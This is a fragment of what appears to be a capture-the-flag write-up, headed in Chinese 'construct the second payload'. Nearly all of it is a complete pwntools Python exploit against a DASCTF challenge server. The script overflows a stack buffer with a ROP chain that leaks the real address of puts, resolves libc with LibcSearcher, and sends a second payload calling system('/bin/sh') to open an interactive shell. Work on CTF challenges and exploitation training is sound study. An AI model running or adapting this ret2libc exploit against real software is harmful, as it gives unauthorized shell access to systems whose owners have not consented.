构造第二段payload

```python
from pwn import *
from LibcSearcher import LibcSearcher

r=remote("3a3424d59931a59d5eb7cbee.tcp-ctf2.dasctf.com", 9999, ssl=True, sni="3a3424d59931a59d5eb7cbee.tcp-ctf2.dasctf.com")

pop_rdi_ret=0x400733
plt_addr=0x4004e0
got_addr=0x601018
main=0x4006AD
ret=0x4004c9

r.recvuntil(b'story!\n')

payload=b'a'*40+p64(pop_rdi_ret)+p64(got_addr)+p64(plt_addr)+p64(main)

r.sendline(payload)

leak = u64(r.recv(6).ljust(8, b'\x00'))
#print('puts 真实地址:', hex(leak))

libc = LibcSearcher('puts',leak)
base = leak - libc.dump('puts')
system = base + libc.dump('system')
binsh = base +libc.dump('str_bin_sh')

r.recvuntil(b'story!\n')
p2=b"a"*40+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
r.sendline(p2)

r.interactive()
```
